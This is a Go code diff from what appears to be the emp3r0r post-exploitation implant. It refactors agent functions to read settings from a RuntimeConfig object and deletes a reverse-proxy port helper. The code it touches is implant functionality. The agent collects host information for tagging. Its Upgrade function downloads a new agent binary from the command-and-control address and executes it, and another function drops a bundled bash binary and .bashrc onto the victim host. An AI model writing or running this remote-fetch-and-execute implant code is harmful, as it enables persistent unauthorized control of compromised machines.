@@ -15,7 +15,6 @@ import (
 	"os/exec"
 	"os/user"
 	"runtime"
-	"strconv"
 	"strings"
 	"time"
 
@@ -28,7 +27,7 @@ import (
 // connect to emp3r0r_data.SocketName, send a message, see if we get a reply
 func IsAgentAlive() bool {
 	log.Println("Testing if agent is alive...")
-	c, err := net.Dial("unix", emp3r0r_data.SocketName)
+	c, err := net.Dial("unix", RuntimeConfig.SocketName)
 	if err != nil {
 		log.Printf("Seems dead: %v", err)
 		return false
@@ -89,8 +88,8 @@ func CollectSystemInfo() *emp3r0r_data.SystemInfo {
 		log.Printf("Gethostname: %v", err)
 		hostname = "unknown_host"
 	}
-	emp3r0r_data.AgentTag = util.GetHostID(emp3r0r_data.AgentUUID)
-	info.Tag = emp3r0r_data.AgentTag // use hostid
+	RuntimeConfig.AgentTag = util.GetHostID(RuntimeConfig.AgentUUID)
+	info.Tag = RuntimeConfig.AgentTag // use hostid
 	info.Hostname = hostname
 	info.Version = emp3r0r_data.Version
 	info.Kernel = util.GetKernelVersion()
@@ -132,7 +131,7 @@ func CollectSystemInfo() *emp3r0r_data.SystemInfo {
 }
 
 func Upgrade(checksum string) error {
-	tempfile := emp3r0r_data.AgentRoot + "/" + util.RandStr(util.RandInt(5, 15))
+	tempfile := RuntimeConfig.AgentRoot + "/" + util.RandStr(util.RandInt(5, 15))
 	_, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/agent", tempfile)
 	if err != nil {
 		return fmt.Errorf("Download agent: %v", err)
@@ -148,23 +147,11 @@ func Upgrade(checksum string) error {
 	return exec.Command(tempfile, "-replace").Start()
 }
 
-func calculateReverseProxyPort() string {
-	p, err := strconv.Atoi(emp3r0r_data.ProxyPort)
-	if err != nil {
-		log.Printf("WTF? emp3r0r_data.ProxyPort %s: %v", emp3r0r_data.ProxyPort, err)
-		return "22222"
-	}
-
-	// reverseProxyPort
-	rProxyPortInt := p + 1
-	return strconv.Itoa(rProxyPortInt)
-}
-
 func ExtractBash() error {
-	if !util.IsFileExist(emp3r0r_data.UtilsPath) {
-		err := os.MkdirAll(emp3r0r_data.UtilsPath, 0700)
+	if !util.IsFileExist(RuntimeConfig.UtilsPath) {
+		err := os.MkdirAll(RuntimeConfig.UtilsPath, 0700)
 		if err != nil {
-			log.Fatalf("[-] Cannot mkdir %s: %v", emp3r0r_data.AgentRoot, err)
+			log.Fatalf("[-] Cannot mkdir %s: %v", RuntimeConfig.AgentRoot, err)
 		}
 	}
 
@@ -176,10 +163,10 @@ func ExtractBash() error {
 	if checksum != emp3r0r_data.BashChecksum {
 		return fmt.Errorf("bash checksum error")
 	}
-	err := ioutil.WriteFile(emp3r0r_data.UtilsPath+"/.bashrc", []byte(emp3r0r_data.BashRC), 0600)
+	err := ioutil.WriteFile(RuntimeConfig.UtilsPath+"/.bashrc", []byte(emp3r0r_data.BashRC), 0600)
 	if err != nil {
 		log.Printf("Write bashrc: %v", err)
 	}
 
-	return ioutil.WriteFile(emp3r0r_data.UtilsPath+"/bash", bashData, 0755)
+	return ioutil.WriteFile(RuntimeConfig.UtilsPath+"/bash", bashData, 0755)
 }
